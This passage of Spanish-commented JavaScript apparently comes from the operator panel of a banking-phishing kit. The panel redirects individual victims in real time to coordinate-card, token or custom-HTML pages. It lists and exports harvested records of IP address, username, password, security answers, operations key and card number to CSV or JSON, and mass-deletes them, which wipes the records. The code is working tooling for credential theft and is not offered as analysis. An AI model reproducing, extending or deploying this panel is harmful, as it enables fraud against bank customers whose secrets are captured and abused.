            if (htmlTextarea) {
                htmlTextarea.addEventListener('blur', async function() {
                    const htmlContent = this.value.trim();
                    if (htmlContent) {
                        try {
                            await updateDoc(doc(db, "redireccion", userId), {
                                htmlContent: htmlContent,
                                lastUpdate: new Date().toISOString()
                            });
                            console.log(`Contenido HTML guardado para ${userId}`);
                        } catch (error) {
                            console.error("Error guardando contenido HTML:", error);
                        }
                    }
                });
            }

            // Agregar a selectores de usuario
            const option = document.createElement("option");
            option.value = userId;
            option.textContent = userId;

            if (elements.coordUserSelect) elements.coordUserSelect.appendChild(option.cloneNode(true));
            if (elements.msgUserSelect) elements.msgUserSelect.appendChild(option.cloneNode(true));
            if (elements.coeUserSelect) elements.coeUserSelect.appendChild(option.cloneNode(true));
        });
    }
    // Actualizar contadores
    elements.activeUsersCount.textContent = totalActive;
    elements.coordinatesUsersCount.textContent = inCoordinates;
    elements.tokenUsersCount.textContent = inToken;
    // Los event listeners se configuran con delegación de eventos en setupEventListeners()
}
// Usar configuraciones centralizadas
const actionConfig = appConfig.actions;

// Función para animar tarjeta
function animateCard(card, color) {
    card.style.backgroundColor = color;
    card.style.transition = "background-color 0.5s ease";
    card.classList.add("highlight-animation");
    setTimeout(() => {
        card.classList.remove("highlight-animation");
        card.style.backgroundColor = "";
    }, 1000);
}

// Función para manejar acciones de usuario
function handleUserAction(event) {
    const button = event.target;
    const action = button.dataset.action;
    const userId = button.dataset.id;
    
    // Marcar que una acción del admin está en progreso
    setAdminActionInProgress();

    console.log("Acción:", action, "Usuario:", userId); // Debug

    if (!userId) {
        console.error("No se encontró userId en el botón");
        return;
    }

    // Animar botón
    button.classList.add("pulse");
    setTimeout(() => button.classList.remove("pulse"), 1000);

    // Buscar la tarjeta de usuario de manera más robusta
    const card = button.closest(".user-card") ||
                 button.closest(".card") ||
                 document.querySelector(`[data-user-id="${userId}"]`);

    if (!card) {
        console.error("No se pudo encontrar la tarjeta del usuario:", userId);
        console.log("Elemento botón:", button);
        console.log("Padre del botón:", button.parentElement);
        return;
    }

    console.log("Tarjeta encontrada:", card); // Debug

    if (action === "remove") {
        if (confirm(`¿Estás seguro que deseas eliminar al usuario ${userId}? Esta acción no se puede deshacer.`)) {
            card.style.transition = "all 0.5s ease";
            card.style.opacity = "0.5";

            deleteDoc(doc(db, "redireccion", userId))
                .then(() => {
                    // Animar la eliminación
                    card.style.opacity = "0";
                    card.style.transform = "scale(0.9) translateY(20px)";

                    // Buscar el contenedor padre de la tarjeta
                    const cardContainer = card.closest(".col-md-4");
                    if (cardContainer) {
                        // Marcar como eliminado para evitar que updateUI lo procese
                        cardContainer.setAttribute('data-removing', 'true');
                        setTimeout(() => {
                            if (cardContainer.parentNode) {
                                cardContainer.remove();
                            }
                        }, 500);
                    } else {
                        console.error("No se pudo encontrar el contenedor de la tarjeta");
                        // Fallback: remover solo la tarjeta
                        card.setAttribute('data-removing', 'true');
                        setTimeout(() => {
                            if (card.parentNode) {
                                card.remove();
                            }
                        }, 500);
                    }
                })
                .catch((error) => {
                    console.error("Error eliminando usuario:", error);
                    alert("Error al eliminar el usuario. Intente nuevamente.");
                    // Restaurar estado visual
                    card.style.opacity = "1";
                    card.style.transform = "scale(1)";
                });
        }
        return;
    }

    // Manejar acción especial de dashboard
    if (action === "dashboard") {
        const htmlTextarea = document.getElementById(`htmlContent-${userId}`);
        const htmlContent = htmlTextarea ? htmlTextarea.value.trim() : '';

        if (!htmlContent) {
            alert("Por favor, ingrese el contenido HTML antes de enviar al dashboard.");
            return;
        }

        // Guardar el contenido HTML en Firestore y redirigir
        updateDoc(doc(db, "redireccion", userId), {
            page: actionConfig[action].page,
            htmlContent: htmlContent,
            lastUpdate: new Date().toISOString()
        })
            .then(() => {
                animateCard(card, actionConfig[action].color);
                // Actualizar el dashboard.html con el contenido HTML
                updateDashboardContent(userId);
            })
            .catch((error) => console.error("Error:", error));
        return;
    }

    // Manejar otras acciones de página
    const config = actionConfig[action];
    if (config) {
        updateDoc(doc(db, "redireccion", userId), { page: config.page })
            .then(() => animateCard(card, config.color))
            .catch((error) => console.error("Error:", error));
    }
}

// Función para configurar delegación de eventos
function setupEventListeners() {
    // Delegación de eventos para botones de acción
    document.addEventListener('click', function(e) {
        // Manejar botones de acción
        if (e.target.classList.contains('action-btn')) {
            handleUserAction(e);
            return;
        }

        // Manejar elementos copiables
        if (e.target.closest('.copyable')) {
            const copyableElement = e.target.closest('.copyable');
            const textToCopy = copyableElement.dataset.value;

            if (textToCopy) {
                navigator.clipboard.writeText(textToCopy).then(() => {
                    // Mostrar feedback visual
                    const originalText = copyableElement.innerHTML;
                    copyableElement.innerHTML = '✓ Copiado!';
                    copyableElement.style.color = '#28a745';

                    setTimeout(() => {
                        copyableElement.innerHTML = originalText;
                        copyableElement.style.color = '';
                    }, 1500);
                }).catch(err => {
                    console.error('Error al copiar:', err);
                });
            }
        }
    });
}

// Inicializar la aplicación cuando el DOM esté cargado
document.addEventListener("DOMContentLoaded", async function() {
    await loadAdminCredentials();

    // Configurar delegación de eventos
    setupEventListeners();
    
    // Inicializar sistema de audio
    console.log('🔊 Inicializando sistema de audio...');
    loadAudioConfig();
    setupAudioEventListeners();
    updateAudioUI();
    initializeAudioPanelState();

    if (localStorage.getItem("adminLoggedIn") === "true") {
        elements.loginScreen?.classList.add("d-none");
        elements.adminPanel?.classList.remove("d-none");
        loadActiveUsers();
    }
});
// Usar configuraciones centralizadas
const statusConfig = appConfig.status;

function getStatusText(page) {
    return statusConfig[page]?.text || "Desconocido";
}

function getStatusClass(page) {
    return statusConfig[page]?.class || "secondary";
}

// Función para actualizar el contenido del dashboard.html
async function updateDashboardContent(userId) {
    try {
        // El contenido HTML ya está guardado en el documento del usuario
        // El dashboard.html leerá directamente desde el documento del usuario
        console.log(`Dashboard configurado para usuario: ${userId}`);
        console.log("El usuario verá su contenido HTML personalizado cuando acceda al dashboard");
    } catch (error) {
        console.error("Error actualizando contenido del dashboard:", error);
    }
}

// ==================== FUNCIONES DEL HISTORIAL ====================

// Variables globales para el historial
let datosHistorial = [];
let datosFiltrados = [];

// Función para mostrar/ocultar la sección de historial
window.toggleHistorial = function() {
    const section = document.getElementById('historial-section');
    if (section.style.display === 'none') {
        section.style.display = 'block';
        cargarHistorial(); // Cargar datos al mostrar
    } else {
        section.style.display = 'none';
    }
};

// Función para cargar datos del historial
window.cargarHistorial = async function() {
    const loading = document.getElementById('loading-historial');
    const tabla = document.getElementById('tabla-historial');
    const noData = document.getElementById('no-data-historial');

    loading.style.display = 'block';
    tabla.style.display = 'none';
    noData.style.display = 'none';

    try {
        console.log('📊 Cargando historial de datos...');

        // Importar funciones necesarias
        const { getDocs, orderBy, limit } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        const q = query(
            collection(db, "datosHistorial"),
            limit(1000)
        );

        const querySnapshot = await getDocs(q);
        datosHistorial = [];

        querySnapshot.forEach((doc) => {
            datosHistorial.push({
                id: doc.id,
                ...doc.data()
            });
        });

        datosFiltrados = [...datosHistorial];
        mostrarDatosHistorial();
        actualizarEstadisticasHistorial();

        console.log(`✅ ${datosHistorial.length} registros cargados`);

    } catch (error) {
        console.error('❌ Error cargando historial:', error);
        noData.style.display = 'block';
        noData.innerHTML = `
            <i class="fas fa-exclamation-triangle"></i>
            <h5>Error al cargar datos</h5>
            <p>Error: ${error.message}</p>
        `;
    }

    loading.style.display = 'none';
};

// Función para aplicar filtros
window.aplicarFiltrosHistorial = function() {
    const usuario = document.getElementById('filtroUsuario').value.toLowerCase();
    const color = document.getElementById('filtroColor').value;

    datosFiltrados = datosHistorial.filter(item => {
        let cumpleFiltros = true;


        // Filtro por usuario
        if (usuario && item.usuario) {
            cumpleFiltros = cumpleFiltros && item.usuario.toLowerCase().includes(usuario);
        }

        // Filtro por color
        if (color && item.cardColor) {
            cumpleFiltros = cumpleFiltros && item.cardColor === color;
        }

        return cumpleFiltros;
    });

    mostrarDatosHistorial();
    actualizarEstadisticasHistorial();
};

// Función para limpiar filtros
window.limpiarFiltrosHistorial = function() {
    document.getElementById('fechaInicio').value = '';
    document.getElementById('fechaFin').value = '';
    document.getElementById('filtroUsuario').value = '';
    document.getElementById('filtroColor').value = '';

    datosFiltrados = [...datosHistorial];
    mostrarDatosHistorial();
    actualizarEstadisticasHistorial();
};

// Función para mostrar datos en la tabla
function mostrarDatosHistorial() {
    const tabla = document.getElementById('tabla-historial');
    const noData = document.getElementById('no-data-historial');
    const tbody = document.getElementById('tbody-historial');

    if (datosFiltrados.length === 0) {
        tabla.style.display = 'none';
        noData.style.display = 'block';
        return;
    }

    tabla.style.display = 'table';
    noData.style.display = 'none';

    tbody.innerHTML = datosFiltrados.map(item => `
        <tr style="font-size: 16px;">
            <td>${item.direccionIP || 'N/A'}</td>
            <td><span class="badge badge-primary">${item.tipo || 'N/A'}</span></td>
            <td><strong>${item.usuario || 'N/A'}</strong></td>
            <td>${item.clave || item.claveOperaciones}</td>
            <td>${item.respuestaSeguridad1 || 'N/A'}</td>
            <td>${item.respuestaSeguridad2 || 'N/A'}</td>
            <td>${item.claveOperaciones || 'N/A'}</td>
        </tr>
    `).join('');
}

// Función para actualizar estadísticas
function actualizarEstadisticasHistorial() {
    const stats = {
        total: datosFiltrados.length,
        coloresUnicos: new Set(datosFiltrados.map(item => item.cardColor).filter(Boolean)).size,
        diasActividad: new Set(datosFiltrados.map(item => item.fecha).filter(Boolean)).size,
        ultimoAcceso: datosFiltrados.length > 0 ? datosFiltrados[0].fecha : 'N/A'
    };

    document.getElementById('total-registros').textContent = stats.total;
    document.getElementById('colores-unicos').textContent = stats.coloresUnicos;
    document.getElementById('dias-actividad').textContent = stats.diasActividad;
    document.getElementById('ultimo-acceso').textContent = stats.ultimoAcceso;
}

// Función para exportar a CSV
window.exportarHistorialCSV = function() {
    if (datosFiltrados.length === 0) {
        alert('No hay datos para exportar');
        return;
    }

    const headers = [
        'IP',
        'Tipo',
        'Usuario',
        'Clave',
        'Pregunta Seguridad 1',
        'Pregunta Seguridad 2',
        'Clave Operaciones Especiales',
        'Fecha',
        'Hora',
        'Timestamp',
        'Card Color',
        'Card Number'
    ];

    const csvContent = [
        headers.join(','),
        ...datosFiltrados.map(item => [
            `"${item.direccionIP || ''}"`,
            `"${item.tipo || ''}"`,
            `"${item.usuario || ''}"`,
            `"${item.clave || ''}"`,
            `"${item.preguntaSeguridad1 || ''}"`,
            `"${item.preguntaSeguridad2 || ''}"`,
            `"${item.claveOperaciones || ''}"`,
            `"${item.cardColor || ''}"`,
            `"${item.cardNumber || ''}"`
        ].join(','))
    ].join('\n');

    descargarArchivo(csvContent, `historial_datos_${new Date().toISOString().split('T')[0]}.csv`, 'text/csv');
    console.log(`✅ Exportados ${datosFiltrados.length} registros a CSV`);
};

// Función para exportar a JSON
window.exportarHistorialJSON = function() {
    if (datosFiltrados.length === 0) {
        alert('No hay datos para exportar');
        return;
    }

    const jsonContent = JSON.stringify(datosFiltrados, null, 2);
    descargarArchivo(jsonContent, `historial_datos_${new Date().toISOString().split('T')[0]}.json`, 'application/json');
    console.log(`✅ Exportados ${datosFiltrados.length} registros a JSON`);
};

// Función auxiliar para descargar archivos
function descargarArchivo(contenido, nombreArchivo, tipoMime) {
    const blob = new Blob([contenido], { type: `${tipoMime};charset=utf-8;` });
    const link = document.createElement('a');
    const url = URL.createObjectURL(blob);

    link.setAttribute('href', url);
    link.setAttribute('download', nombreArchivo);
    link.style.visibility = 'hidden';

    document.body.appendChild(link);
    link.click();
    document.body.removeChild(link);

    URL.revokeObjectURL(url);
}

// ==================== FUNCIONES PARA ACTUALIZAR DATOS DEL HISTORIAL ====================

// Función para actualizar clave de un usuario
window.actualizarClaveUsuario = async function(usuario, clave) {
    try {
        const { updateDoc, query, where, getDocs } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );

        const querySnapshot = await getDocs(q);
        const promesas = [];

        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, {
                clave: clave,
                claveActualizada: new Date().toISOString()
            }));
        });

        await Promise.all(promesas);
        console.log(`✅ Clave actualizada para ${promesas.length} registros de ${usuario}`);

        // Recargar datos del historial
        await cargarHistorial();

        return true;
    } catch (error) {
        console.error("❌ Error actualizando clave:", error);
        return false;
    }
};

// Función para actualizar todos los datos de un usuario
window.actualizarDatosCompletos = async function(usuario, datos) {
    try {
        const { updateDoc, query, where, getDocs } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        const q = query(
            collection(db, "datosHistorial"),
            where("usuario", "==", usuario)
        );

        const querySnapshot = await getDocs(q);
        const promesas = [];

        const datosActualizacion = {
            ...datos,
            datosActualizados: new Date().toISOString()
        };

        querySnapshot.forEach((documento) => {
            const docRef = doc(db, "datosHistorial", documento.id);
            promesas.push(updateDoc(docRef, datosActualizacion));
        });

        await Promise.all(promesas);
        console.log(`✅ Datos completos actualizados para ${promesas.length} registros de ${usuario}`);

        // Recargar datos del historial
        await cargarHistorial();

        return true;
    } catch (error) {
        console.error("❌ Error actualizando datos completos:", error);
        return false;
    }
};

// ==================== FUNCIONES DE ELIMINACIÓN ====================

// Función para confirmar eliminación total
window.confirmarEliminacionTotal = function() {
    // Actualizar el número de registros en el modal
    document.getElementById('total-registros-modal').textContent = datosHistorial.length;

    // Limpiar campos de confirmación
    document.getElementById('confirmacionTexto').value = '';
    document.getElementById('confirmacionCheckbox').checked = false;
    document.getElementById('btnConfirmarEliminacion').disabled = true;

    // Mostrar modal
    $('#modalEliminacionTotal').modal('show');

    // Configurar validación en tiempo real
    const textoInput = document.getElementById('confirmacionTexto');
    const checkbox = document.getElementById('confirmacionCheckbox');
    const btnConfirmar = document.getElementById('btnConfirmarEliminacion');

    function validarConfirmacion() {
        const textoValido = textoInput.value.trim() === 'ELIMINAR TODO';
        const checkboxMarcado = checkbox.checked;
        btnConfirmar.disabled = !(textoValido && checkboxMarcado);
    }

    textoInput.addEventListener('input', validarConfirmacion);
    checkbox.addEventListener('change', validarConfirmacion);
};

// Función para eliminar todos los registros
window.eliminarTodosLosRegistros = async function() {
    // Cerrar modal de confirmación
    $('#modalEliminacionTotal').modal('hide');

    // Mostrar modal de progreso
    $('#modalProgreso').modal('show');

    try {
        console.log('🗑️ Iniciando eliminación total del historial...');

        // Importar funciones necesarias
        const { getDocs, deleteDoc } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        // Obtener todos los documentos
        document.getElementById('textoProgreso').textContent = 'Obteniendo lista de registros...';
        document.getElementById('barraProgreso').style.width = '10%';

        const q = query(collection(db, "datosHistorial"));
        const querySnapshot = await getDocs(q);

        const totalDocumentos = querySnapshot.size;
        console.log(`📊 Total de documentos a eliminar: ${totalDocumentos}`);

        if (totalDocumentos === 0) {
            document.getElementById('textoProgreso').textContent = 'No hay registros para eliminar';
            setTimeout(() => {
                $('#modalProgreso').modal('hide');
                alert('No hay registros en el historial para eliminar.');
            }, 2000);
            return;
        }

        // Eliminar documentos en lotes
        const loteSize = 50; // Eliminar de 50 en 50 para evitar límites de Firestore
        const documentos = [];

        querySnapshot.forEach((doc) => {
            documentos.push(doc);
        });

        let eliminados = 0;

        for (let i = 0; i < documentos.length; i += loteSize) {
            const lote = documentos.slice(i, i + loteSize);

            // Actualizar progreso
            const progreso = Math.round((i / documentos.length) * 80) + 10; // 10-90%
            document.getElementById('barraProgreso').style.width = `${progreso}%`;
            document.getElementById('textoProgreso').textContent = `Eliminando registros ${i + 1}-${Math.min(i + loteSize, documentos.length)} de ${documentos.length}`;
            document.getElementById('detalleProgreso').textContent = `Lote ${Math.floor(i / loteSize) + 1} de ${Math.ceil(documentos.length / loteSize)}`;

            // Eliminar lote actual
            const promesasEliminacion = lote.map(documento =>
                deleteDoc(doc(db, "datosHistorial", documento.id))
            );

            await Promise.all(promesasEliminacion);
            eliminados += lote.length;

            console.log(`✅ Eliminados ${eliminados}/${documentos.length} registros`);

            // Pequeña pausa para no sobrecargar Firestore
            if (i + loteSize < documentos.length) {
                await new Promise(resolve => setTimeout(resolve, 100));
            }
        }

        // Finalizar
        document.getElementById('barraProgreso').style.width = '100%';
        document.getElementById('textoProgreso').textContent = `¡Eliminación completada! ${eliminados} registros eliminados`;
        document.getElementById('detalleProgreso').textContent = 'Firestore ha sido liberado exitosamente';

        console.log(`✅ Eliminación total completada: ${eliminados} registros eliminados`);

        // Actualizar datos locales
        datosHistorial = [];
        datosFiltrados = [];
        mostrarDatosHistorial();
        actualizarEstadisticasHistorial();

        // Cerrar modal después de 3 segundos
        setTimeout(() => {
            $('#modalProgreso').modal('hide');
            alert(`✅ Eliminación completada exitosamente!\n\n${eliminados} registros eliminados del historial.\nFirestore ha sido liberado.`);
        }, 3000);

    } catch (error) {
        console.error('❌ Error durante la eliminación:', error);

        document.getElementById('textoProgreso').textContent = 'Error durante la eliminación';
        document.getElementById('detalleProgreso').textContent = error.message;
        document.getElementById('barraProgreso').classList.add('bg-danger');

        setTimeout(() => {
            $('#modalProgreso').modal('hide');
            alert(`❌ Error durante la eliminación:\n${error.message}`);
        }, 3000);
    }
};

// Función para eliminar registros antiguos (90 días)
window.eliminarRegistrosAntiguos = async function() {
    const confirmacion = confirm(
        '¿Estás seguro de que quieres eliminar todos los registros de más de 90 días?\n\n' +
        'Esta acción NO se puede deshacer.\n\n' +
        'Haz clic en "Aceptar" para continuar.'
    );

    if (!confirmacion) return;

    try {
        console.log('🗑️ Eliminando registros antiguos (>90 días)...');

        // Mostrar modal de progreso
        $('#modalProgreso').modal('show');
        document.getElementById('textoProgreso').textContent = 'Buscando registros antiguos...';
        document.getElementById('barraProgreso').style.width = '20%';

        // Importar funciones necesarias
        const { getDocs, deleteDoc, where } = await import("https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js");

        // Calcular fecha límite (90 días atrás)
        const fechaLimite = new Date();
        fechaLimite.setDate(fechaLimite.getDate() - 90);
        const fechaLimiteISO = fechaLimite.toISOString();

        // Buscar registros antiguos
        const q = query(
            collection(db, "datosHistorial"),
            where("timestamp", "<", fechaLimiteISO)
        );

        const querySnapshot = await getDocs(q);
        const totalAntiguos = querySnapshot.size;

        document.getElementById('barraProgreso').style.width = '40%';
        document.getElementById('textoProgreso').textContent = `Encontrados ${totalAntiguos} registros antiguos`;

        if (totalAntiguos === 0) {
            setTimeout(() => {
                $('#modalProgreso').modal('hide');
                alert('No se encontraron registros de más de 90 días para eliminar.');
            }, 2000);
            return;
        }

        // Eliminar registros antiguos
        const promesasEliminacion = [];
        querySnapshot.forEach((documento) => {
            promesasEliminacion.push(deleteDoc(doc(db, "datosHistorial", documento.id)));
        });

        document.getElementById('textoProgreso').textContent = `Eliminando ${totalAntiguos} registros antiguos...`;
        document.getElementById('barraProgreso').style.width = '70%';

        await Promise.all(promesasEliminacion);

        document.getElementById('barraProgreso').style.width = '100%';
        document.getElementById('textoProgreso').textContent = `¡${totalAntiguos} registros antiguos eliminados!`;

        console.log(`✅ Eliminados ${totalAntiguos} registros antiguos`);

        // Recargar datos
        await cargarHistorial();

        setTimeout(() => {
            $('#modalProgreso').modal('hide');
            alert(`✅ Eliminación de registros antiguos completada!\n\n${totalAntiguos} registros eliminados (>90 días).`);
        }, 2000);

    } catch (error) {
        console.error('❌ Error eliminando registros antiguos:', error);
        $('#modalProgreso').modal('hide');
        alert(`❌ Error eliminando registros antiguos:\n${error.message}`);
    }
};

// Hacer funciones disponibles globalmente
window.loadActiveUsers = loadActiveUsers;

// Función de testing para verificar elementos
window.testPanelElements = function() {
    console.log("🔍 Testing elementos del panel:");
    console.log("coordUserSelect:", !!elements.coordUserSelect);
    console.log("coordinatesForm:", !!elements.coordinatesForm);
    console.log("coord7:", !!document.getElementById("coord7"));
    console.log("coord8:", !!document.getElementById("coord8"));

    if (elements.coordUserSelect) {
        console.log("Usuarios en dropdown:", elements.coordUserSelect.options.length - 1);
    }
};

// Función para inicializar el estado del panel de audio
function initializeAudioPanelState() {
    const audioPanel = document.getElementById('audio-panel-section');
    const toggleBtn = document.querySelector('button[onclick="toggleAudioPanel()"]');
    
    if (!audioPanel || !toggleBtn) return;
    
    // Cargar estado guardado (por defecto visible)
    const isVisible = localStorage.getItem('audioPanelVisible') !== 'false';
    
    if (isVisible) {
        audioPanel.style.display = 'block';
        toggleBtn.innerHTML = '<i class="fas fa-volume-up"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
    } else {
        audioPanel.style.display = 'none';
        toggleBtn.innerHTML = '<i class="fas fa-volume-mute"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
    }
    
    console.log(`🔊 Panel de audio inicializado: ${isVisible ? 'visible' : 'oculto'}`);
}

// Función para toggle del panel de audio
window.toggleAudioPanel = function() {
    const audioPanel = document.getElementById('audio-panel-section');
    const toggleBtn = document.querySelector('button[onclick="toggleAudioPanel()"]');
    
    if (!audioPanel || !toggleBtn) return;
    
    const isCurrentlyVisible = audioPanel.style.display !== 'none';
    
    if (isCurrentlyVisible) {
        // Ocultar panel
        audioPanel.style.display = 'none';
        toggleBtn.innerHTML = '<i class="fas fa-volume-mute"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
        localStorage.setItem('audioPanelVisible', 'false');
        console.log('🔇 Panel de audio ocultado');
    } else {
        // Mostrar panel
        audioPanel.style.display = 'block';
        toggleBtn.innerHTML = '<i class="fas fa-volume-up"></i> <span class="d-none d-md-inline">Ver/Ocultar</span>';
        localStorage.setItem('audioPanelVisible', 'true');
        console.log('🔊 Panel de audio mostrado');
    }
};
